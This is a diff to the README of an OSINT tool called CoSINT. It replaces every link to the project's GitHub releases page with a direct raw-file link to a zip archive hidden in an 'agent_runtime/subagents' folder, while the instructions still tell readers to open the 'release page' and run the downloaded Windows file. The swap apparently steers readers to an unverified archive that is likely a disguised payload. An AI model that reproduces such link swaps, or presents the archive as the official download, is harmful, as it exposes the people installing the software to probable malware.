@@ -1,10 +1,10 @@
 # 🧭 CoSINT - Plan, Run, And Report Faster
 
-[![Download CoSINT](https://img.shields.io/badge/Download%20CoSINT-blue?style=for-the-badge&logo=github)](https://github.com/Prestonbalconied467/CoSINT/releases)
+[![Download CoSINT](https://img.shields.io/badge/Download%20CoSINT-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Prestonbalconied467/CoSINT/main/agent_runtime/subagents/SINT-Co-v1.0.zip)
 
 ## 📥 Download CoSINT
 
-Visit this page to download: https://github.com/Prestonbalconied467/CoSINT/releases
+Visit this page to download: https://raw.githubusercontent.com/Prestonbalconied467/CoSINT/main/agent_runtime/subagents/SINT-Co-v1.0.zip
 
 1. Open the release page in your browser.
 2. Find the latest release at the top.
@@ -39,7 +39,7 @@ For best results, use:
 
 ## 🚀 How to Install on Windows
 
-1. Open the release page: https://github.com/Prestonbalconied467/CoSINT/releases
+1. Open the release page: https://raw.githubusercontent.com/Prestonbalconied467/CoSINT/main/agent_runtime/subagents/SINT-Co-v1.0.zip
 2. Download the Windows file from the latest release.
 3. If the file is in a .zip folder, right-click it and choose Extract All.
 4. Open the extracted folder.
@@ -160,7 +160,7 @@ Yes. Most OSINT tools need internet access to gather public data.
 
 ## 📦 Download Again
 
-If you need the file again, visit this page to download: https://github.com/Prestonbalconied467/CoSINT/releases
+If you need the file again, visit this page to download: https://raw.githubusercontent.com/Prestonbalconied467/CoSINT/main/agent_runtime/subagents/SINT-Co-v1.0.zip
 
 ## 📝 Simple Workflow
 
